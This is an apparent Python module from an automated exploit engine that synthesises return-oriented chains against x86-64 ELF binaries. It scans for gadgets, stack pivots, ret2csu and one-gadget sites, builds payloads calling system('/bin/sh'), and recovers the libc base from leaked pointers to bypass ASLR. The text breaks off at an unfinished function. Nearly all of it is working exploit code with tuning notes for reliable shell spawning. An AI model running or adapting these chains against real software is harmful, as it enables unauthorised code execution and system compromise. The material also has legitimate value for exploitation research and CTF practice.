"""ROP / ret2system chain synthesis (Phase 9 frontier, assisted).

For a no-PIE x86-64 binary without a convenient "win" function, build a return-oriented chain
that calls `system("/bin/sh")`: a `pop rdi; ret` gadget loads the argument, a "/bin/sh" string
from the image is the argument, and `system@plt` is the call target. Deterministic and pure
stdlib (an objdump assist resolves the PLT stub when available). The stage confirms the chain
by reaching `system` under a breakpoint with RDI pointing at "/bin/sh".
"""
from __future__ import annotations

import logging
import re
import shutil
import struct
import subprocess
from functools import lru_cache

from ... import observe

_log = logging.getLogger(__name__)

# useful x86-64 gadget byte patterns (the VA of the match is the gadget address)
GADGETS = {
    "pop_rdi": b"\x5f\xc3",           # pop rdi ; ret
    "pop_rsi": b"\x5e\xc3",           # pop rsi ; ret
    "pop_rdx": b"\x5a\xc3",           # pop rdx ; ret
    "ret": b"\xc3",                   # ret (stack alignment)
    "pop_rsi_r15": b"\x5e\x41\x5f\xc3",  # pop rsi ; pop r15 ; ret (libc_csu)
    "jmp_rsp": b"\xff\xe4",           # jmp rsp  -- redirect PC to the stack (ret2shellcode, no leak)
    "call_rsp": b"\xff\xd4",          # call rsp -- same, pushing a return first
    # STACK PIVOT. The answer when the overflow reaches the saved return address and then runs out
    # of room: a chain needs several words past it and a short overflow has one or two, so the
    # first word redirects RSP into a buffer that IS long enough and the chain lives there.
    #   leave; ret   -- rsp = rbp + 8, so whoever controls the saved RBP controls the new stack
    #   pop rsp; ret -- rsp comes straight off the stack: the next word IS the new stack pointer
    #   xchg rax,rsp -- pivot to a register already pointing at the buffer (common after a read
    #                   wrapper returns it)
    "leave_ret": b"\xc9\xc3",         # leave ; ret
    "pop_rsp": b"\x5c\xc3",           # pop rsp ; ret
    "xchg_rax_rsp": b"\x48\x94\xc3",  # xchg rax, rsp ; ret
}

#: `add rsp, imm8 ; ret` -- the third pivot shape, and the only one whose encoding carries a
#: PARAMETER (how far the stack moves), so it is searched rather than matched: 48 83 C4 <imm8> C3.
_ADD_RSP_IMM8 = (b"\x48\x83\xc4", b"\xc3")


def _loads(data):
    """PT_LOAD segments as (file_off, filesz, vaddr, flags), for ELFCLASS64 AND ELFCLASS32. The
    32-bit path is what lets the ARM gadget scan (and any 32-bit target) see executable segments --
    ELF32 program headers are 32 bytes with a different field order than ELF64's 56."""
    if len(data) < 52 or data[:4] != b"\x7fELF" or data[4] not in (1, 2):
        return []
    endc = "<" if data[5] == 1 else ">"
    if data[4] == 2:                                   # ELFCLASS64
        e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
        e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    else:                                              # ELFCLASS32
        e_phoff = struct.unpack_from(endc + "I", data, 28)[0]
        e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 42)
    out = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        if data[4] == 2:
            p_type, p_flags = struct.unpack_from(endc + "II", data, o)
            p_offset = struct.unpack_from(endc + "Q", data, o + 8)[0]
            p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
            p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        else:                                          # ELF32 phdr: type,off,vaddr,paddr,filesz,...,flags
            p_type, p_offset, p_vaddr, _paddr, p_filesz, _memsz, p_flags = \
                struct.unpack_from(endc + "7I", data, o)
        if p_type == 1:                                # PT_LOAD
            out.append((p_offset, p_filesz, p_vaddr, p_flags))
    return out


def _va_of(segs, file_off, need_x=False):
    for off, sz, va, flags in segs:
        if off <= file_off < off + sz and (not need_x or (flags & 1)):
            return va + (file_off - off)
    return None


@lru_cache(maxsize=4096)
def _find_exec(data: bytes, pat: bytes, align: int = 1):
    # Cached: the same target/libc bytes are scanned for the same opcode pattern many times in one
    # run -- build_exploit alone runs 4+ times per target (early + per-crash + format + heap), and
    # poc_primitive/leak/chain_primitive/brop call the gadget finders independently. The result is an
    # immutable VA (int) or None, so caching cannot be corrupted by a caller mutating it; keyed on the
    # bytes VALUE, so a different build (plain vs sanitizer) or the libc vs the target is a distinct
    # entry. This is the hot inner scan behind find_gadget and every br/jmp/bx finder.
    #
    # `align`: a FIXED-WIDTH ISA (AArch64/ARM 4, RISC-V 2 with compressed code) only executes an
    # instruction at an aligned address. An unaligned byte match straddles two real instructions
    # -- branching to it faults -- and stopping at it would hide the real, aligned gadget further
    # on. So keep searching past misaligned hits. x86 (variable width) keeps the default 1.
    segs = _loads(data)
    for off, sz, va, flags in segs:
        if not (flags & 1):                            # executable segments only
            continue
        idx = data.find(pat, off, off + sz)
        while idx >= 0:
            if align <= 1 or (va + (idx - off)) % align == 0:
                return _va_of(segs, idx, need_x=True)
            idx = data.find(pat, idx + 1, off + sz)
    return None


def find_gadget(data: bytes, name: str):
    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
    pat = GADGETS.get(name)
    return _find_exec(data, pat) if pat else None


# __libc_csu_init gadgets (present in ELF binaries built against pre-glibc-2.34 startup and in
# many firmware/legacy targets). The pop gadget loads rbx/rbp/r12/r13/r14/r15; the call gadget
# does rdx=r15; rsi=r14; edi=r13d; call [r12+rbx*8] -- a full 3-argument controlled call.
CSU_POP = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
CSU_CALL = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc])


def find_pivots(data: bytes) -> list:
    """Every stack-pivot gadget in an executable segment, as [{insn, va, kind, delta}].

    A pivot is what makes a SHORT overflow exploitable. The engine already recovers the offset to
    the saved return address and, when only a word or two follows it, correctly reports that the
    chain does not fit -- an L2 primitive with no L3. The pivot moves RSP somewhere that does fit:

      * `leave; ret` consumes the saved RBP, which the same overflow wrote, so the attacker names
        the new stack outright. Two words of overflow are enough.
      * `pop rsp; ret` takes the new stack pointer from the next word on the old stack.
      * `add rsp, N; ret` steps forward into a region the same write already filled.
      * `xchg rax, rsp; ret` pivots to a register that already points at the buffer.

    Ordered by how little the attacker has to know: `leave; ret` first (it needs only the saved
    RBP, which the overflow supplies), then the pops, then the register exchange."""
    out = []
    for name, kind in (("leave_ret", "rbp"), ("pop_rsp", "stack"), ("xchg_rax_rsp", "reg:rax")):
        va = find_gadget(data, name)
        if va:
            out.append({"insn": name.replace("_", " "), "va": va, "kind": kind, "delta": None})
    # add rsp, imm8 ; ret -- one entry per distinct displacement, smallest first
    pre, post = _ADD_RSP_IMM8
    seen = set()
    for off, sz, va, fl in _loads(data):
        if not (fl & 1):
            continue
        seg = data[off:off + sz]
        i = 0
        while True:
            j = seg.find(pre, i)
            if j < 0 or j + 5 > len(seg):
                break
            i = j + 1
            if seg[j + 4:j + 5] != post:
                continue
            delta = seg[j + 3]
            if delta >= 0x80:                            # imm8 is SIGN-extended: 0xf8 is rsp -= 8,
                continue                                 # a move backwards, not an advance
            if delta in seen or delta == 0:
                continue
            seen.add(delta)
            out.append({"insn": f"add rsp, 0x{delta:x} ; ret", "va": va + j,
                        "kind": "advance", "delta": delta})
    out.sort(key=lambda g: ({"rbp": 0, "stack": 1, "advance": 2}.get(g["kind"], 3),
                            g["delta"] or 0))
    return out


def find_csu(data: bytes):
    """{'pop': va, 'call': va} for the __libc_csu_init ret2csu gadgets, or None."""
    pop = _find_exec(data, CSU_POP)
    call = _find_exec(data, CSU_CALL)
    return {"pop": pop, "call": call} if pop and call else None


# jmp/call <reg>: `FF /4` (jmp) and `FF /2` (call), modrm E0+reg / D0+reg. The register order is the
# x86 encoding order (rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi). A ret2shellcode redirect needs whichever
# register happens to point at the input buffer at the fault: rsp (shellcode sits after the return
# address), or a general register the callee left pointing at the buffer start (`jmp rax`, common
# when a read wrapper returns the buffer, is the canonical no-gadget-needed case after jmp rsp).
_REGS8 = ("rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi")


def find_reg_control_gadgets(data: bytes):
    """Every gadget that redirects the instruction pointer to an address already in a register, as
    [{insn, reg, va}]: `jmp <reg>` (FF /4), `call <reg>` (FF /2), and `push <reg>; ret` (50+reg C3)
    -- the last is at least as common as `jmp rsp` and, via `push rsp; ret`, lands in the exact same
    place, so it doubles the reach of a ret2shellcode that needs no info leak. reg is the register
    whose value the PC takes: rsp means the shellcode sits after the return address, any other
    register means it points at the buffer start. Ordered rsp first (the most common layout)."""
    out = []
    order = {"rsp": 0}
    for insn, pat in [("jmp", lambda i: bytes((0xFF, 0xE0 + i))),
                      ("call", lambda i: bytes((0xFF, 0xD0 + i))),
                      ("push+ret", lambda i: bytes((0x50 + i, 0xC3)))]:
        for i, reg in enumerate(_REGS8):
            va = _find_exec(data, pat(i))
            if va is not None:
                out.append({"insn": insn, "reg": reg, "va": va})
    out.sort(key=lambda g: (order.get(g["reg"], 1), g["reg"], g["insn"]))
    return out


def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0, align_ret=None):
    """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
    call-gadget does the 3-arg call *[ptr+rbx*8]. `align_ret` (a `ret` VA) prepends one return to
    fix the 16-byte-aligned rsp that system()/do_system needs -- the parity is environment-
    dependent, so a live caller tries both."""
    body = bytearray(_cyclic(offset))
    if align_ret is not None:
        body += struct.pack("<Q", align_ret & 0xFFFFFFFFFFFFFFFF)
    for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
        body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
    body += b"C" * 64                                  # post-call padding (breakpoint fires first)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def find_one_gadgets(data: bytes):
    """One-gadget candidates in a libc image: addresses that reach `execve("/bin/sh", ...)` in a
    single jump. Found without the external `one_gadget` tool (offline) by the byte pattern
    `lea rdi,[rip -> "/bin/sh"]` (48 8d 3d <disp32>) followed within a short window by a call to
    execve or an execve syscall (rax=0x3b; 0f 05). Jumping to the lea sets rdi="/bin/sh"; the site
    fires execve iff rsi and rdx are NULL at that moment -- so the constraint is recorded (whether
    the window zeroes them inline, in which case there is no precondition). Returns
    [{offset, constraint, execve}] sorted by offset (offset = VA of the lea = the one-gadget)."""
    segs = _loads(data)
    if not segs:
        return []
    binsh = find_string(data, b"/bin/sh")
    if binsh is None:
        return []
    syms = libc_symbols(data, ["execve"])
    execve_va = syms.get("execve")
    out, seen = [], set()
    for off, sz, va, fl in segs:
        if not (fl & 1):
            continue
        seg = data[off:off + sz]
        i = 0
        while True:
            j = seg.find(b"\x48\x8d\x3d", i)             # lea rdi, [rip + disp32]
            if j < 0 or j + 7 > len(seg):
                break
            i = j + 1
            disp = int.from_bytes(seg[j + 3:j + 7], "little", signed=True)
            site = va + j
            if site + 7 + disp != binsh:                 # rdi must resolve to "/bin/sh"
                continue
            win = seg[j + 7:j + 7 + 80]                  # look ahead for the execve call/syscall
            fires = False
            for k in range(0, len(win) - 4):
                if execve_va is not None and win[k] == 0xE8:   # call rel32 -> execve
                    tgt = (va + j + 7 + k) + 5 + int.from_bytes(win[k + 1:k + 5], "little", signed=True)
                    if tgt == execve_va:
                        fires = True
                        break
                if win[k] == 0xB8 and win[k + 1:k + 5] == b"\x3b\x00\x00\x00":   # mov eax,0x3b
                    fires = True
                    break
                if win[k:k + 7] == b"\x48\xc7\xc0\x3b\x00\x00\x00":              # mov rax,0x3b
                    fires = True
                    break
            if not fires:
                continue
            zsi = any(p in win for p in (b"\x31\xf6", b"\x45\x31\xf6", b"\x48\x31\xf6"))  # xor esi,esi
            zdx = any(p in win for p in (b"\x31\xd2", b"\x45\x31\xd2", b"\x48\x31\xd2"))  # xor edx,edx
            constraint = "none (rsi/rdx zeroed inline)" if (zsi and zdx) else \
                ("rdx==NULL" if zsi else ("rsi==NULL" if zdx else "rsi==NULL && rdx==NULL"))
            if site not in seen:
                seen.add(site)
                out.append({"offset": site, "constraint": constraint, "execve": execve_va})
    return sorted(out, key=lambda g: g["offset"])


@lru_cache(maxsize=512)
def find_string(data: bytes, s: bytes):
    """VA of byte string `s` (NUL-terminated form preferred) in a loaded segment, or None."""
    segs = _loads(data)
    for probe in (s + b"\x00", s):
        for off, sz, _va, _fl in segs:
            idx = data.find(probe, off, off + sz)
            if idx >= 0:
                return _va_of(segs, idx)
    return None


def resolve_plt(exe_path, name: str):
    """Address of `<name@plt>` via objdump, or None (objdump absent / symbol not called)."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe_path)],
                             capture_output=True, timeout=60, check=False).stdout.decode(
                                 "latin-1", "ignore")
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(r"^0*([0-9a-fA-F]+)\s+<" + re.escape(name) + r"(?:@plt)?>:", out, re.M)
    return int(m.group(1), 16) if m else None


# --- single-address ret2win: a direct in-image call to a shell-spawning libc function -----------
# The win a stripped/no-PIE target hides and the recovered call graph routinely MISSES: a short run
# of code that sets up the argument and `call`s system("/bin/sh") / execl(...) directly (a backdoor,
# a debug hook, a dead `never()`). Found by scanning the executable BYTES for a direct `call`/`jmp
# rel32` whose target is the shell PLT stub -- NOT the (often-incomplete) recovered edges; on the
# target that motivated this, the disassembler folded the whole function into an adjacent one and
# recorded no `system` edge at all, so find_win's call-graph route saw nothing.
#
# Why a ret2win and not a ROP chain: this is the ONLY x86-64 shell primitive a NUL-TRUNCATING string
# sink (strcpy/strcat/sprintf) can deliver. The overwrite is ONE address; on a no-PIE image its high
# bytes are zero, so the copy's terminating NUL and the already-zero saved-return high bytes rebuild
# the exact address -- whereas a multi-word ROP chain's first embedded NUL (every 0x40xxxx gadget has
# one) cuts the copy and nothing past it lands. We offer both the function entry and the argument-
# setup instruction as candidate entries: they bracket the two stack alignments libc's `do_system`
# movaps needs (entering past a `push rbp` shifts rsp by 8). The caller confirms each by a SPAWNED
# SHELL plus a neutralised-slot negative control, so a wrong entry (bad alignment, arg not set, or a
# byte that was never an instruction boundary) spawns nothing and is simply discarded -- never filed.
_SHELL_PLT_NAMES = ("system", "execl", "execlp", "execv", "execve", "execvp", "execle")
#: Openers of an instruction that sets up the first argument (rdi / its feeder rax). Entering at one
#: of these skips the prologue's `push rbp`, giving the alternate stack alignment.
_RDI_SETUP_OPENERS = (
    b"\x48\x8d\x3d",       # lea rdi, [rip+disp32]   -- &"/bin/sh" straight into rdi
    b"\x48\x8d\x05",       # lea rax, [rip+disp32]   -- &"/bin/sh" into rax (then mov rdi, rax)
    b"\x48\xc7\xc7",       # mov rdi, imm32 (sign-extended)
    b"\xbf",               # mov edi, imm32          -- the no-PIE &"/bin/sh" idiom
)
#: Function-prologue openers -- the entry WITH `push rbp`, the other alignment.
_PROLOGUE_OPENERS = (
    b"\xf3\x0f\x1e\xfa",   # endbr64
    b"\x55\x48\x89\xe5",   # push rbp ; mov rbp, rsp
)


def find_shell_call_wins(data: bytes, exe_path, *, max_candidates: int = 16) -> list:
    """Candidate ret2win ENTRY addresses (ints, best-first) that reach system/exec*("/bin/sh") with
    the argument already set up in the image. Pure stdlib byte scan; see the comment above. Empty
    when the image makes no direct call to a shell-spawning PLT stub. The caller MUST confirm each
    candidate by a real spawned shell -- these are leads, not a verdict."""
    segs = _loads(data)
    if not segs:
        return []
    plts = {}
    for n in _SHELL_PLT_NAMES:
        a = resolve_plt(exe_path, n)
        if a is not None:
            plts[a] = n
    if not plts:
        return []
    cands: list = []                                       # (score, va) -- lower score tried first
    seen: set = set()

    def _emit(va, score):
        if va is not None and va not in seen:
            seen.add(va)
            cands.append((score, va))

    for off, sz, va_base, flags in segs:
        if not (flags & 1):                                # executable segments only
            continue
        end = off + sz
        p = off
        while p + 5 <= end:
            if data[p] in (0xE8, 0xE9):                     # call rel32 / jmp rel32
                rel = struct.unpack_from("<i", data, p + 1)[0]
                site_va = va_base + (p - off)
                if (site_va + 5 + rel) in plts:
                    # argument-setup entries: nearest opener in the 40 bytes before the call
                    # (closer to the call = more likely the real setup -> a lower, earlier score).
                    for opener in _RDI_SETUP_OPENERS:
                        q = data.rfind(opener, max(off, p - 40), p)
                        if q >= 0:
                            _emit(va_base + (q - off), 10 + (p - q))
                    # function-entry alignments: nearest prologue in the 64 bytes before the call
                    for opener in _PROLOGUE_OPENERS:
                        q = data.rfind(opener, max(off, p - 64), p)
                        if q >= 0:
                            base = va_base + (q - off)
                            _emit(base, 100 + (p - q))
                            if opener == b"\xf3\x0f\x1e\xfa":   # also: just past the endbr64
                                _emit(base + 4, 80 + (p - q))
            p += 1
    cands.sort(key=lambda sv: sv[0])
    return [va for _s, va in cands[:max_candidates]]


#: How much room the chain leaves BELOW itself and the alignment it lands on -- both measured, and
#: the reason is worth keeping: the pivoted stack is not a place to read words from, it IS the
#: stack, and every function the chain calls grows down into it.
#:
#: Two failures taught the number. With the chain at the buffer's START the pivot worked, `pop rdi`
#: and `system@plt` both ran, and the process died inside `_dl_runtime_resolve_xsavec` -- the lazy
#: PLT resolver needs hundreds of bytes below the call and a 64-byte-aligned save area. With the
#: slot pre-resolved and the chain placed high, `system()` ITSELF still needed room: measured
#: across buffer sizes, 192, 448 and 960 bytes of slack all segfaulted and 1984 spawned a shell.
#:
#: And the space that counts is WRITABLE MEMORY BELOW THE CHAIN, not space inside the buffer: a
#: 256-byte buffer with 8 KiB of other globals underneath works, because the stack keeps growing
#: past the buffer's start into whatever is mapped writable there. A buffer at the very bottom of
#: .data does not, however big it is -- the stack runs off into read-only memory.
_PIVOT_SLACK = 0x800
_PIVOT_ALIGN = 0x10


def pivot_placement(buf_addr: int, buf_len: int, *, slack: int = _PIVOT_SLACK,
                    align: int = _PIVOT_ALIGN):
    """Where in a writable buffer to put the pivoted chain, or None when the buffer is too small.

    Returns `(chain_addr, offset_in_buffer)`. The chain goes as high as the slack allows so the
    callees have stack below it, and on `align` so an `xsavec` in the resolver does not fault."""
    if buf_len < 0x40:
        return None                                    # no room for a chain and any slack at all
    room = min(slack, max(0, buf_len - 0x40))
    addr = (buf_addr + room) & ~(align - 1)
    off = addr - buf_addr
    if off <= 0 or off >= buf_len:
        return None
    return addr, off


def build_pivot_chain(offset: int, pivot: dict, stage2_addr: int, stage2: list,
                      *, saved_rbp_slot: bool = True) -> tuple:
    """A TWO-STAGE chain for an overflow too short to hold one.

    The engine already recovers the offset to the saved return address, and when only a word or two
    follows it the honest verdict today is an L2 primitive with no L3: a ret2libc chain is three or
    four words and does not fit. A pivot moves the stack instead of filling it.

    Returns `(stage1, stage2_bytes)`:

      * `stage1` is what the SHORT overflow writes -- filler, then (for `leave; ret`) the saved RBP
        the gadget will consume, then the gadget itself. Two words past the return address is
        enough, which is the whole point.
      * `stage2_bytes` is the chain, written wherever the attacker can put bytes (the same buffer,
        an earlier field, an environment variable): `leave; ret` sets `rsp = rbp + 8`, so the saved
        RBP is `stage2_addr - 8` and execution continues straight into the words that follow.

    The other pivots take their destination differently and the caller supplies it: `pop rsp; ret`
    reads the new stack pointer from the next word, so stage1 is `[pop_rsp][stage2_addr]`;
    `add rsp, N; ret` steps forward into bytes the same write already placed."""
    kind = pivot.get("kind")
    if kind == "rbp" and saved_rbp_slot:
        # `leave; ret` consumes the SAVED RBP, which sits one word BELOW the return address --
        # `offset` is the distance to the return address itself (what `recover_ip_offset` yields),
        # so the filler stops 8 bytes short and the gadget goes in the return slot. Getting this
        # one slot late writes the RBP value INTO the return slot: the program returns to the
        # buffer address itself and segfaults, which is what the first hand-proof did.
        body = bytearray(_cyclic(max(0, offset - 8)))
        body += struct.pack("<Q", (stage2_addr - 8) & 0xFFFFFFFFFFFFFFFF)   # saved rbp
        body += struct.pack("<Q", int(pivot["va"]) & 0xFFFFFFFFFFFFFFFF)    # return address
    elif kind == "stack":
        body = bytearray(_cyclic(offset))
        # `pop rsp; ret`: the next word IS the new stack pointer.
        body += struct.pack("<Q", int(pivot["va"]) & 0xFFFFFFFFFFFFFFFF)
        body += struct.pack("<Q", stage2_addr & 0xFFFFFFFFFFFFFFFF)
    else:
        body = bytearray(_cyclic(offset))
        body += struct.pack("<Q", int(pivot["va"]) & 0xFFFFFFFFFFFFFFFF)
    s2 = bytearray()
    for word in stage2:
        s2 += struct.pack("<Q", int(word) & 0xFFFFFFFFFFFFFFFF)
    return bytes(body), bytes(s2)


def pivot_fits(offset: int, overflow_len: int, *, words_needed: int = 4) -> bool:
    """Does the overflow have room for a CHAIN, or only for a pivot?

    `words_needed` is the shortest useful finisher (a ret2system is `[ret][pop rdi][&/bin/sh]
    [system]`). When the write reaches the saved return address but carries fewer words than that,
    the chain cannot be placed there at any offset and the pivot is not an optimisation -- it is
    the only route."""
    room = max(0, overflow_len - offset) // 8
    return room >= words_needed


def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length: int,
                     ret_gadget=None) -> bytes:
    """cyclic filler, then: [ret align] ; pop rdi ; &"/bin/sh" ; system."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)                       # 16-byte stack alignment for movaps
    chain += [pop_rdi, binsh, system]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


# --- ret2libc WITH a runtime leak (defeats ASLR without a `system` PLT entry) -------------------
# A modern challenge imports only puts/printf/read from libc -- never `system` -- and runs under
# ASLR, so neither a `system` PLT slot nor a fixed libc address exists. The classic answer is two
# stages over one connection: leak a libc pointer (call puts@plt on a GOT entry), subtract the
# symbol's known offset in THIS libc to recover the base, then re-trigger the overflow with a
# system("/bin/sh") chain built from base+offset. These helpers are the reusable primitives.

def _elf_class_endian(data: bytes):
    return (data[4] == 2, "<" if data[5] == 1 else ">")   # (is64, struct endian char)


def _sections(data: bytes) -> dict:
    """{section name: (offset, size, entsize)} from the section header table; {} on malformation."""
    try:
        is64, endc = _elf_class_endian(data)
        if is64:
            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x3A)
            fmt, off_i, sz_i, ent_i = endc + "IIQQQQIIQQ", 4, 5, 9
        else:
            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x2E)
            fmt, off_i, sz_i, ent_i = endc + "IIIIIIIIII", 4, 5, 9
        shs = [struct.unpack_from(fmt, data, e_shoff + i * e_shentsize) for i in range(e_shnum)]
        strtab_off = shs[e_shstrndx][off_i]

        def _name(o):
            end = data.find(b"\x00", strtab_off + o)
            return data[strtab_off + o:end].decode("latin-1", "replace")

        return {_name(sh[0]): (sh[off_i], sh[sz_i], sh[ent_i]) for sh in shs}
    except Exception:
        observe.absorbed(_log, "answering empty")
        return {}


def libc_version(data: bytes):
    """(major, minor) of a glibc image, from the highest `GLIBC_2.NN` symbol-version string it
    carries. Every glibc exports versioned symbols up to its OWN release, so the max GLIBC_2.NN in
    the image is its version -- robust, needs no banner string, works on a stripped libc. Returns
    None when no such version string is present (not a glibc). Used to gate heap techniques
    correctly (hooks removed in 2.34, safe-linking in 2.32, tcache double-free key in 2.29, House of
    Force only <2.29) instead of assuming a fixed version."""
    import re as _re
    best = None
    for m in _re.finditer(rb"GLIBC_2\.(\d{1,3})\b", data):
        n = int(m.group(1))
        if best is None or n > best:
            best = n
    return (2, best) if best is not None else None


def libc_symbols(data: bytes, names) -> dict:
    """{name: st_value} for the requested EXPORTED symbols of a libc/.so, read straight from
    .dynsym. `st_value` is the unrelocated vaddr, so the runtime address is `libc_base + st_value`.
    Pure stdlib (no readelf/nm), best-effort: {} on any malformation."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    stroff = st[0]
    want, out = set(names), {}
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                st_name, _info, _oth, st_shndx, st_value, _sz = struct.unpack_from(
                    endc + "IBBHQQ", data, o)
            else:
                st_name, st_value, _sz, _info, _oth, st_shndx = struct.unpack_from(
                    endc + "IIIBBH", data, o)
        except struct.error:
            break
        if st_shndx == 0 or not st_value:            # undefined import, or no address -> skip
            continue
        end = data.find(b"\x00", stroff + st_name)
        nm = data[stroff + st_name:end].decode("latin-1", "replace")
        if nm in want and nm not in out:
            out[nm] = st_value
            if len(out) == len(want):
                break
    return out


# Distinctive libc symbols a real leak commonly discloses (FILE structs, environ, key functions);
# a curated anchor set so a stack/PIE value can't coincidentally corroborate a bogus base.
_LEAK_ANCHOR_SYMS = (
    "_IO_2_1_stdout_", "_IO_2_1_stderr_", "_IO_2_1_stdin_", "stdout", "stderr", "stdin",
    "environ", "__environ", "_environ", "_IO_file_jumps", "_IO_wfile_jumps",
    "__libc_start_main", "__free_hook", "__malloc_hook", "system", "puts", "printf",
    "read", "write", "malloc", "free", "setvbuf", "__stack_chk_fail", "exit")


def recover_libc_base(leaked, libc_data: bytes, *, allow_single: bool = False):
    """Recover a libc's load base from leaked runtime pointers, the same page-offset method as
    exploit.recover_pie_base but anchored on the LIBC's own exported symbols. A leaked pointer to a
    libc symbol (a FILE like _IO_2_1_stdout_, a function address in the GOT) has `& 0xfff` equal to
    that symbol's page offset; base = leaked - symbol. libc has thousands of symbols so a lone match
    is cheap coincidence, so a base is accepted only when >=2 DISTINCT leaked slots corroborate it.
    Returns the page-aligned base or None. NOTE: a bare return-address-into-libc (e.g. the
    __libc_start_call_main return commonly on the stack) is NOT a symbol start and will not match --
    that case needs a version-specific offset the caller must supply.

    Anchored on a CURATED set of distinctive, commonly-leaked symbols (the _IO_ FILE structs,
    environ, a few well-known functions) rather than all of libc's thousands: with thousands of
    anchors a stack/PIE value coincidentally matches some symbol's page offset ~every time, so two
    of them corroborate a bogus base (a leaked stack address masqueraded as libc). The curated set
    keeps the real leaks (stdout/stderr/environ/puts...) while making a false 2-way match unlikely.

    `allow_single` accepts a base from ONE leaked pointer when that pointer's page offset is
    matched by EXACTLY ONE anchor in the curated set -- the same contract, and the same wording,
    as `exploit.recover_pie_base`. It exists because a HEAP over-read is not a stack over-read: a
    stack dump hands over a dozen different slots, while a heap neighbour commonly holds one
    distinctive pointer repeated at a fixed stride (a FILE* in every element of an array). Thirty
    two copies of `stdout` are one slot, not thirty two, so the two-slot rule rejects a leak that
    is in fact unambiguous. Uniqueness across the anchors is what makes it safe: if no other
    curated symbol shares that page offset, the value can only be that symbol."""
    anchors: dict = {}
    for va in libc_symbols(libc_data, _LEAK_ANCHOR_SYMS).values():
        anchors.setdefault(va & 0xFFF, []).append(va)
    if not anchors:
        return None
    # HOW OFTEN each value appeared, not just which values appeared. An over-read returns live
    # memory and STALE memory together: a freed chunk holds whatever pointers used to be there,
    # and one of those can match a curated anchor's page offset by chance. A live pointer in a
    # structured region repeats -- an array of FILE* holds `stdout` in every element -- and
    # garbage in a dead chunk does not. That difference is the only evidence available here, and
    # it was being thrown away by collecting values into a set.
    counts: dict = {}
    for v in leaked:
        v = int(v)
        if 0x1000 <= v <= 0x7FFFFFFFFFFF:
            counts[v] = counts.get(v, 0) + 1
    support: dict = {}
    for v in counts:
        for va in anchors.get(v & 0xFFF, ()):
            base = v - va
            if base > 0 and (base & 0xFFF) == 0:
                support.setdefault(base, set()).add(v)

    def _score(b):
        # distinct corroborating slots first -- that is the strong rule and nothing displaces it;
        # then the multiplicity of the best-repeated value under this base.
        return (len(support[b]), max(counts[v] for v in support[b]))

    best = max(support, key=_score, default=None)
    if best is None:
        return None
    if len(support[best]) >= 2:
        return best
    if not allow_single:
        return None
    # One slot. Accept it only when its page offset is matched by exactly one anchor, so the
    # value cannot be any other symbol -- and only when nothing ELSE is equally well supported.
    # `max` used to break a tie between two one-slot candidates by dict order, so a stale
    # pointer in the freed memory next door could be preferred over the live `stdout` beside it
    # and the function returned a WRONG base: measured once in eight runs of a 1 KiB heap
    # over-read, under load, which is the worst answer this can give -- a caller cannot tell it
    # from a right one, where None it can.
    lone = next(iter(support[best]))
    if len(anchors.get(lone & 0xFFF, ())) != 1:
        return None
    rivals = [b for b in support if b != best and len(support[b]) == 1
              and max(counts[v] for v in support[b]) >= counts[lone]]
    if rivals:
        return None                                 # nothing distinguishes them; decline
    return best


def got_entry(data: bytes, name: str):
    """The GOT slot the PLT stub for `name` dereferences, read from .rela.plt/.rel.plt. For a
    no-PIE binary this is the absolute address whose contents (the resolved libc function) a
    `puts(got)` leak prints -- so leaking it and subtracting the symbol's libc offset gives the
    libc base. Pure stdlib, best-effort: None if the reloc/symbol tables are absent."""
    secs = _sections(data)
    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not rela or not ds or not st:
        return None
    is64, endc = _elf_class_endian(data)
    rel_ent = rela[2] or (24 if is64 else 8)
    sym_ent = ds[2] or (24 if is64 else 16)
    stroff = st[0]

    def _symname(idx):
        try:
            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
            end = data.find(b"\x00", stroff + st_name)
            return data[stroff + st_name:end].decode("latin-1", "replace")
        except struct.error:
            return ""

    for o in range(rela[0], rela[0] + rela[1], rel_ent):
        try:
            if is64:
                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
                sym = r_info >> 32
            else:
                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
                sym = r_info >> 8
        except struct.error:
            break
        if _symname(sym) == name:
            return r_offset
    return None


def got_entries(data: bytes) -> dict:
